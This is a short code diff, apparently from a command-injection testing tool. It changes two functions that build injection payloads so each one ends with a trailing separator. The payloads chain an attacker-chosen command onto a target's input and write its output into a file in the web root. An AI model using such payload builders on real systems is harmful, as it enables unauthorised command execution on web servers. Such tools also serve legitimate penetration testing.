@@ -32,7 +32,8 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               )
   else:
     payload = (separator +
-              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
+              "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
+              separator
               )
 
   return payload
@@ -83,7 +84,8 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
   else:
     settings.USER_SUPPLIED_CMD = cmd
     payload = (separator +
-              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
+              cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE +
+              separator
               )
 
   return payload
